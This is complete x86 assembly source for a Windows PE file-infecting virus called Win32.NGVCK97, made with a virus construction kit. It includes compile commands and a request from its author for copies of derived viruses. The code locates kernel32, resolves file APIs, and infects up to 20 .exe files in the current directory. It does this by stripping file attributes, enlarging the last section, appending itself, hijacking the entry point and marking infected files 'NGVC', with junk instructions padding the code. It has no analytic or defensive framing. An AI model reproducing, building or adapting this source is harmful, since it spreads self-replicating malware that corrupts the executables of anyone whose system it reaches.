              
;
;
; Win32.NGVCK97 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK97
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 33
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 43984 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 adc ecx, 8137122d                      ; Trash
 popad
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]
 xchg ebx, eax

 lea ebx, [ebp+APIOffsets]
 xchg edi, ebx


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear edx
 and edx, 0
 mov dl, byte ptr [eax]
                                        ; add eax, 1
 inc eax

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; eax points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add eax, edx
                                        ; mov ebx, -1
 mov ebx, ( -1d + 8d )
 sub ebx, 8d
 and ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], 0
 add dword ptr [edi], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec ecx
 jnz GetApisLoop
 lea eax, [ebp+Outbreak]
 xchg esi, eax

 push esi
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov eax, offset filemask
 add eax, ebp

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov edx, 20
 mov edx, ( 20d xor 39d )
 xor edx, 39d
 mov dword ptr [ebp+InfCounter], edx

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

 mov edi, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], edi

 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ebx


                                        ; get Kernel by using hardcoded values
 mov edi, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edi, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ebx
 push 0
 pop ebx

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ebx]
 mov ebx, offset GetKernel32Exception
 add ebx, ebp

 push ebx
 push eax

                                        ; add edi, 1
 inc edi
GetKernelLoop:
                                        ; clear edx
 mov edx, 0
 add edi, -1
 mov dx, word ptr [edi+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+edx+34h]
 jnz GetKernelLoop
 push edi
 pop dword ptr [ebp+KernelMZ]
 mov edx, [edi+3Ch]
 add edx, edi
 mov [KernelPE+ebp], edx

                                        ; clear esi
 mov esi, -54204d
 add esi, 54204d

 pop dword ptr fs:[esi]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ebx
 mov ebx, -29454d
 add ebx, 29454d

 mov edx, dword ptr fs:[ebx]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear ebx
 and ebx, 0

 pop dword ptr fs:[ebx]
 pop ebx
 popad
 stc
ret


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop edx
                                        ; retrieve PE - Header
 mov esi, edx
 add esi, [edx+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov ebx, [esi]
 inc esi
 sub esi, 61d
                                        ; mov ecx, -1
 mov ecx, ( -1d - 28d )
 add ecx, 28d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
 inc edx                                ; Trash
                                        ; infect by increasing the last section
 mov esi, eax
                                        ; get last section
 movzx ecx, word ptr [esi+06h]
 sub ecx, 1
 imul ecx, ecx, 28h
                                        ; add eax, 120
 add eax, 120d
 add eax, ecx
 mov ebx, dword ptr [esi+74h]
 shl ebx, 3
 add eax, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov ebx, [eax+10h]
                                        ; mov ecx, ebx
 mov ecx, ebx
 add ebx, [eax+14h]
 push ebx
 mov edx, ecx
 add edx, [eax+0Ch]
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
                                        ; clear edx
 and edx, 0

 add edx, [eax+10h]
 push edx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add edx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], edx
 pop edx
 add edx,  (VirusSize-1293d)
 add edx, 1293d
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], edx
 mov edx, dword ptr [eax+10h]
 add edx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
 and dword ptr [ebp+Trash1], 1379133    ; Trash
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, ( 128d - 14d )
 add eax, 14d
 push eax
 lea eax, [ebp+WFD_szFileName]


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 add eax, 1
 jz NoInfection
                                        ; check for maximum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp edx, 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear edx
 mov edx, 30599d
 sub edx, 30599d
 mov dx, word ptr [esi+3Ch]
 dec edx
 inc edx
 jz Notagoodfile
                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [esi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edi]
 sub eax, 'EP'
 jz Goodfile2
                                        ; mov eax, 35057
 mov eax, ( 35057d + 37d )
 sub eax, 37d
 cmp eax, 35057d
 or ecx, ecx                            ; Trash
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov ax, word ptr [edi+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear ecx
 xor ecx, ecx
 xor ecx, dword ptr [ebp+Attributes]
 push ecx
 lea edx, [ebp+WFD_szFileName]
 xchg edx, eax

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 db 'Win32.NGVCK97 created by SnakeByte',0
 MapAddress  dd 0h
 AlignTemp   dd 0h
 Trash2      dd 0h
 counter     dw 0h
 ATableVA    dd 0h
 AlignReg1   dd 0h
 KernelPE    dd 0h
 FileHandle  dd 0h
 Trash1      dd 0h
 AlignReg2   dd 0h

 APINames:
 db 11d, 'CreateFileA'
 db 14d, 'FindFirstFileA'
 db 09d, 'FindClose'
 db 13d, 'FindNextFileA'
 db 15d, 'UnmapViewOfFile'
 db 18d, 'CreateFileMappingA'
 db 11d, 'CloseHandle'
 db 18d, 'GetFileAttributesA'
 db 13d, 'MapViewOfFile'
 db 18d, 'SetFileAttributesA'

 MapHandle   dd 0h
 NewEIP      dd 0h
 NewSize     dd 0h
 OTableVA    dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XSetFileAttributesA    dd 0h

 InfCounter  dd 0h
 KernelMZ    dd 0h
 NTableVA    dd 0h
 OldBase     dd 400000h
 filemask    db '*.Exe',0
 Attributes  dd 0h
 FindHandle  dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, 0
 add ebx, 276d
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edi


ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret
 inc ecx                                ; Trash

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]

 push ecx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, offset WIN32_FIND_DATA
 add eax, ebp

 push eax
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 sub eax, eax

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 inc eax
 push eax
 push 80000000h or 40000000h
 lea ebx, [ebp+WFD_szFileName]
 xchg esi, ebx

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear ebx
 mov ebx, 64355d
 sub ebx, 64355d
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
                                        ; clear edx
 mov edx, 0
 push ecx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; eax Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 mov esi, -19419d
 add esi, 19419d
 add esi, [ebx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 dec esi
 add esi, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [esi]
 add ebx, [ebp+KernelMZ]
 sub ecx, 57850644d                     ; Trash
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add esi, 4
 dec esi
 add esi, 5d
                                        ; get NTableVA
 mov ebx, dword ptr [esi]
                                        ; add esi, 4
 dec esi
 add esi, 5d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
 sal ecx, 26d                           ; Trash
                                        ; get OTableVA
 mov ebx, dword ptr [esi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+NTableVA]
 add dword ptr [ebp+Trash1], 584389     ; Trash


SearchNextApi1:                         ; search for the API's
 push ecx
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [ecx]
                                        ; mov ecx, ebx
 mov ecx, ebx
                                        ; mov edi, ebx
                                        ; clear edi
 mov edi, 0
 add edi, ebx
 sub dword ptr [ebp+Trash1], 1297287    ; Trash
 push edx
 push edi
 push eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bl, byte ptr [edi]
 cmp bl, byte ptr [eax]
 jne ApiNotFound
 sub edx, 1
 sub edx, 1
 add edx, 1
 jz FoundApi1
                                        ; add eax, 1
 inc eax
                                        ; add edi, 1
 inc edi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop edi
 pop edx
 pop ecx
                                        ; add ecx, 4
 add ecx, 4d
 adc dword ptr [ebp+Trash1], eax        ; Trash
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop eax
 pop ecx
 pop eax
 pop ecx
                                        ; retrieve the offset
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop esi
 movzx ebx, word ptr [esi]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



CryptEnd:
 or ecx, eax                            ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

